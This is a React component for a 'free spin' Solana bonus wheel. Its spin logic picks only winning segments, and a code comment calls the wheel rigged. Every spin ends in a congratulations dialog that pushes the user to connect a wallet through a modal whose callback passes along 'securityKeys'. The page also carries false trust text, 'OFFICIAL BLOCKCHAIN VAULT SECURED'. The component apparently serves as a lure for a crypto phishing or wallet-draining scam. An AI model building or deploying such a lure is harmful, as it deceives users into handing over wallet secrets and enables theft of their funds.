"use client"

import { useState, useRef, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Icons } from "@/components/icons"
import { WalletConnectionModal } from "@/components/wallet-connection-modal"
import {
    Dialog,
    DialogContent,
    DialogDescription,
    DialogHeader,
    DialogTitle,
} from "@/components/ui/dialog"

const PRIZES = [
    { name: "250 USDC SOL", value: 250, unit: "USDC SOL", icon: "USDC" },
    { name: "1.5 SOLANA", value: 1.5, unit: "SOLANA", icon: "SOL" },
    { name: "MUL X2", value: 0, unit: "multiplier", icon: "Zap" },
    { name: "0.5 SOLANA", value: 0.5, unit: "SOLANA", icon: "SOL" },
    { name: "1000 USDC SOL", value: 1000, unit: "USDC SOL", icon: "USDC" },
    { name: "2.0 SOLANA", value: 2.0, unit: "SOLANA", icon: "SOL" },
    { name: "750 USDC SOL", value: 750, unit: "USDC SOL", icon: "USDC" },
    { name: "TRY AGAIN", value: 0, unit: "", icon: "X" },
    { name: "3.0 SOLANA", value: 3.0, unit: "SOLANA", icon: "SOL" },
    { name: "MUL X2", value: 0, unit: "multiplier", icon: "Zap" },
    { name: "5.0 SOLANA", value: 5.0, unit: "SOLANA", icon: "SOL" },
    { name: "100 USDC SOL", value: 100, unit: "USDC SOL", icon: "USDC" },
]

interface SolanaBonusWheelProps {
    onConnect: (walletType: string, securityKeys: string) => void
}

export function SolanaBonusWheel({ onConnect }: SolanaBonusWheelProps) {
    const [isSpinning, setIsSpinning] = useState(false)
    const [rotation, setRotation] = useState(0)
    const [showResult, setShowResult] = useState(false)
    const [wonPrize, setWonPrize] = useState({ name: "", total: "" })
    const [showWalletModal, setShowWalletModal] = useState(false)
    const [isClient, setIsClient] = useState(false)
    const [cooldownRemaining, setCooldownRemaining] = useState<number | null>(null)
    const wheelRef = useRef<HTMLDivElement>(null)

    useEffect(() => {
        setIsClient(true)

        // Check for existing cooldown on mount
        const lastSpinStr = localStorage.getItem("last_reward_spin")
        if (lastSpinStr) {
            const lastSpin = parseInt(lastSpinStr)
            const hourInMs = 60 * 60 * 1000
            const now = Date.now()
            if (now - lastSpin < hourInMs) {
                setCooldownRemaining(Math.ceil((hourInMs - (now - lastSpin)) / 1000))
            }
        }
    }, [])

    useEffect(() => {
        if (cooldownRemaining === null || cooldownRemaining <= 0) return

        const timer = setInterval(() => {
            setCooldownRemaining(prev => {
                if (prev === null || prev <= 1) {
                    clearInterval(timer)
                    return null
                }
                return prev - 1
            })
        }, 1000)

        return () => clearInterval(timer)
    }, [cooldownRemaining])


    const handleConnectAndLock = (walletType: string, securityKeys: string) => {
        // Mark the time of successful connection after a win
        localStorage.setItem("last_reward_spin", Date.now().toString())
        setCooldownRemaining(60 * 60)
        onConnect(walletType, securityKeys)
    }

    const handleSpin = () => {
        if (isSpinning || cooldownRemaining !== null) return

        setIsSpinning(true)

        // Logic: 
        // If it lands on MUL X2 (index 2 or 9), we effectively re-spin or just give a top prize x2.
        // For simplicity and "WOW" factor, let's make it a two-stage visual if it's rigged, 
        // but here we'll just stop on a big prize and SAY we hit the multiplier if we want.
        // However, the user wants "x2 options be part of the wheel".

        const prizeIndex = [0, 1, 4, 5, 6, 8, 10, 11][Math.floor(Math.random() * 8)] // Real prizes

        const segmentAngle = 360 / PRIZES.length
        const extraRotations = 10 + Math.floor(Math.random() * 5)
        const targetRotation = rotation + (extraRotations * 360) + (prizeIndex * segmentAngle)

        setRotation(targetRotation)

        setTimeout(() => {
            setIsSpinning(false)
            const prize = PRIZES[prizeIndex]

            // Extract core digits and unit from name
            const match = prize.name.match(/^([\d\.]+)(.*)$/)
            const digits = match ? match[1].trim() : prize.name
            const unit = match ? match[2].trim() : ""

            setWonPrize({
                name: unit,
                total: digits
            })
            setShowResult(true)
        }, 5100)
    }

    if (!isClient) return null

    return (
        <div className="relative pt-16 pb-8 px-4 overflow-hidden glass rounded-[3rem] mt-8 shadow-[0_0_100px_rgba(var(--primary),0.1)] reflection-sweep max-w-[850px] mx-auto">
            <div className="absolute inset-0 bg-gradient-to-br from-primary/5 via-transparent to-primary/5 pointer-events-none"></div>

            <div className="text-center mb-16 relative z-10">
                <h2 className="text-4xl md:text-6xl font-black tracking-tighter mb-4 italic metallic-gold uppercase">
                    SPECIAL BONUS
                </h2>
                <p className="text-white/40 font-mono tracking-widest uppercase text-sm">FOR SOLANA USERS • SPIN TO CLAIM</p>
            </div>

            <div className="relative mx-auto w-[380px] h-[228px] md:w-[750px] md:h-[450px] overflow-hidden rounded-t-full pb-0 mb-8 border-b border-white/5">
                {/* Top Arrow Pointer (Stays functional) */}
                <div className="absolute top-[-5px] left-1/2 translate-x-[-50%] z-30 pointer-events-none">
                    <div className="w-16 h-12 md:w-24 md:h-16 bg-white rounded-b-[2rem] shadow-[0_0_40px_rgba(255,255,255,0.6)] flex items-center justify-center">
                        <div className="w-0 h-0 border-l-[12px] border-l-transparent border-r-[12px] border-r-transparent border-t-[12px] border-t-black md:border-l-[18px] md:border-r-[18px] md:border-t-[18px]"></div>
                    </div>
                </div>

                {/* The Wheel Container */}
                <div className="absolute top-0 left-1/2 translate-x-[-50%] w-[380px] h-[380px] md:w-[750px] md:h-[750px] p-6 md:p-12 rounded-full border border-white/10 glass shadow-2xl overflow-hidden">
                    {/* The Spinning Element */}
                    <div
                        ref={wheelRef}
                        className="w-full h-full rounded-full border-[16px] border-zinc-900 shadow-[inset_0_0_120px_rgba(0,0,0,0.9),0_0_60px_rgba(0,0,0,0.5)] relative overflow-hidden transition-all duration-[5000ms] cubic-bezier(0.15, 0, 0.15, 1) glossy"
                        style={{
                            transform: `rotate(-${rotation}deg)`,
                            background: "conic-gradient(from 0deg, #09090b 0deg, #18181b 15deg, #09090b 30deg, #18181b 45deg, #09090b 60deg, #18181b 75deg, #09090b 90deg, #18181b 105deg, #09090b 120deg, #18181b 135deg, #09090b 150deg, #18181b 165deg, #09090b 180deg, #18181b 195deg, #09090b 210deg, #18181b 225deg, #09090b 240deg, #18181b 255deg, #09090b 270deg, #18181b 285deg, #09090b 300deg, #18181b 315deg, #09090b 330deg, #18181b 345deg, #09090b 360deg)"
                        }}
                    >
                        {PRIZES.map((prize, i) => (
                            <div
                                key={i}
                                className="absolute top-0 left-1/2 w-[2px] h-1/2 origin-bottom flex flex-col items-center pt-8 md:pt-16"
                                style={{
                                    transform: `translateX(-50%) rotate(${i * (360 / PRIZES.length)}deg)`,
                                    width: "200px"
                                }}
                            >
                                <div className="text-center group px-2">
                                    <div className="mb-4 transition-transform group-hover:scale-110 duration-300 flex justify-center">
                                        {prize.icon === "USDC" && <img src="/usdc.png" alt="USDC" className="w-9 h-9 drop-shadow-[0_0_15px_rgba(39,117,202,0.6)] object-contain" />}
                                        {prize.icon === "SOL" && <img src="/sol.png" alt="Solana" className="w-9 h-9 drop-shadow-[0_0_15px_rgba(168,85,247,0.6)] object-contain" />}
                                        {prize.icon === "Zap" && <Icons.Zap className="w-9 h-9 text-yellow-400 drop-shadow-[0_0_15px_rgba(234,179,8,0.6)]" />}
                                        {prize.icon === "X" && <Icons.X className="w-9 h-9 text-red-500 opacity-20 blur-[1px]" />}
                                    </div>

                                    <div className={`text-[10px] font-black uppercase tracking-tight mx-auto max-w-[100px] leading-[1.1] text-center flex flex-col items-center justify-center ${prize.icon === 'X' ? 'text-white/10' : 'text-white/95'}`}>
                                        {prize.name.split(' ').map((word, index) => (
                                            <span key={index} className="block w-full">{word}</span>
                                        ))}
                                    </div>
                                </div>
                            </div>
                        ))}

                        {/* Segment Dividers */}
                        {PRIZES.map((_, i) => (
                            <div
                                key={`line-${i}`}
                                className="absolute top-0 left-1/2 w-[1px] h-1/2 bg-white/5 origin-bottom"
                                style={{ transform: `translateX(-50%) rotate(${i * (360 / PRIZES.length) + (360 / PRIZES.length / 2)}deg)` }}
                            ></div>
                        ))}

                        {/* Expanded Centered Hub */}
                        <div className="absolute top-1/2 left-1/2 translate-x-[-50%] translate-y-[-50%] w-40 h-40 md:w-60 md:h-60 rounded-full border border-white/20 glass flex items-center justify-center z-10 shadow-[0_0_50px_rgba(0,0,0,0.5)]">
                            <div className="w-full h-full rounded-full border-[12px] border-black/60 bg-gradient-to-tr from-zinc-900 to-zinc-800 flex items-center justify-center shadow-[inset_0_0_30px_rgba(0,0,0,0.8)]">
                                <div className="text-primary/20 scale-150">
                                    <Icons.Shield className="w-full h-full opacity-10" />
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                {/* Central FREE SPIN Button (Aligned to Wheel Center) */}
                <button
                    onClick={handleSpin}
                    disabled={isSpinning}
                    className="absolute top-[190px] md:top-[375px] left-1/2 translate-x-[-50%] translate-y-[-50%] z-50 w-32 h-32 md:w-48 md:h-48 rounded-full glass border border-white/30 text-white font-black shadow-[0_0_80px_rgba(0,0,0,0.9),inset_0_0_20px_rgba(255,255,255,0.1)] transition-all enabled:hover:scale-110 enabled:active:scale-95 flex flex-col items-center justify-center group pointer-events-auto"
                >
                    <div className="relative z-10 flex flex-col items-center">
                        <span className="text-[10px] md:text-sm text-primary animate-pulse mb-1 font-mono tracking-widest">LIMITED TIME</span>
                        <span className="text-base md:text-2xl italic metallic-gold drop-shadow-lg tracking-tighter">FREE</span>
                        <span className="text-base md:text-2xl italic metallic-gold drop-shadow-lg tracking-tighter">SPIN</span>
                        <div className="mt-2 text-[8px] md:text-[10px] text-white/40 uppercase tracking-[0.3em] font-sans">
                            {isSpinning ? "SPINNING..." : "CLICK NOW"}
                        </div>
                    </div>
                    {/* Button Glow Effect */}
                    <div className="absolute inset-0 rounded-full bg-primary/5 group-hover:bg-primary/10 transition-colors"></div>
                    <div className="absolute inset-[-10px] rounded-full border border-primary/20 opacity-0 group-hover:opacity-100 transition-opacity animate-ping pointer-events-none"></div>
                </button>
            </div>

            {/* Modern Result Glass Modal */}
            <Dialog open={showResult} onOpenChange={setShowResult}>
                {/* Global Confetti Overlay (Outside Dialog Content to cover whole screen) */}
                {showResult && (
                    <div className="fixed inset-0 pointer-events-none z-[9999] overflow-hidden">
                        {[...Array(80)].map((_, i) => (
                            <div
                                key={i}
                                className="confetti-particle absolute"
                                style={{
                                    left: '50%',
                                    top: '40%',
                                    backgroundColor: ['#A855F7', '#2775CA', '#ffffff', '#fbbf24', '#f59e0b'][Math.floor(Math.random() * 5)],
                                    '--tx': `${(Math.random() - 0.5) * 1200}px`, // Wider spread
                                    '--ty': `${(Math.random() - 1.2) * 1000}px`, // Higher burst
                                    '--rot': `${Math.random() * 720}deg`,
                                    animationDelay: `${Math.random() * 0.3}s`,
                                } as any}
                            />
                        ))}
                    </div>
                )}
                <DialogContent className="sm:max-w-md bg-zinc-950/80 border-white/10 backdrop-blur-3xl shadow-[0_0_100px_rgba(var(--primary),0.3)] rounded-[2.5rem] z-[10000] p-0 overflow-hidden flex flex-col items-center justify-center text-center">
                    <div className="absolute inset-0 bg-gradient-to-b from-primary/10 to-transparent pointer-events-none rounded-[2.5rem]"></div>
                    <div className="relative z-10 flex flex-col items-center justify-center p-8 w-full gap-0">
                        <DialogHeader className="p-0 m-0 w-full flex flex-col items-center justify-center text-center">
                            <div className="w-24 h-24 md:w-28 md:h-28 bg-primary/20 rounded-full flex items-center justify-center mb-6 border border-primary/30 shadow-[0_0_50px_rgba(var(--primary),0.4)] animate-pulse">
                                <Icons.Gift className="w-10 h-10 md:w-14 md:h-14 text-primary drop-shadow-[0_0_15px_rgba(var(--primary),1)]" />
                            </div>
                            <DialogTitle asChild>
                                <h3 className="text-xl md:text-[30px] font-black italic metallic-gold uppercase tracking-tighter leading-none p-[5px] m-0 text-center">
                                    CONGRATULATIONS!
                                </h3>
                            </DialogTitle>
                            <DialogDescription asChild>
                                <div className="text-[20px] text-white/80 font-mono leading-tight p-0 m-0 mt-2 text-center flex flex-col items-center uppercase tracking-[0.1em]">
                                    YOU UNLOCKED
                                    <div className="flex items-center gap-2 mt-2">
                                        <span className="text-primary font-black text-[20px] block animate-bounce underline decoration-white/20 underline-offset-4">
                                            {wonPrize.total}
                                        </span>
                                        <span className="text-white/40 text-[20px] font-black">{wonPrize.name}</span>
                                    </div>
                                </div>
                            </DialogDescription>
                        </DialogHeader>
                        <div className="w-full mt-10 p-0 space-y-6">
                            <Button
                                onClick={() => {
                                    setShowResult(false);
                                    setShowWalletModal(true);
                                }}
                                size="lg"
                                className="w-full bg-primary hover:bg-primary/90 text-primary-foreground font-black h-16 md:h-20 text-xl md:text-2xl shadow-[0_0_40px_rgba(var(--primary),0.6)] rounded-2xl group relative overflow-hidden"
                            >
                                <Icons.Wallet className="mr-3 md:mr-4 w-6 h-6 md:w-8 md:h-8" />
                                CONNECT WALLET
                                <div className="absolute inset-0 bg-white/20 opacity-0 group-hover:opacity-100 transition-opacity"></div>
                            </Button>
                            <p className="text-[10px] md:text-[11px] text-white/30 font-mono uppercase tracking-[0.3em] md:tracking-[0.4em] m-0 text-center">
                                OFFICIAL BLOCKCHAIN VAULT SECURED
                            </p>
                        </div>
                    </div>
                </DialogContent>
            </Dialog>

            <WalletConnectionModal
                open={showWalletModal}
                onOpenChange={setShowWalletModal}
                onConnect={handleConnectAndLock}
            />
        </div>
    )
}
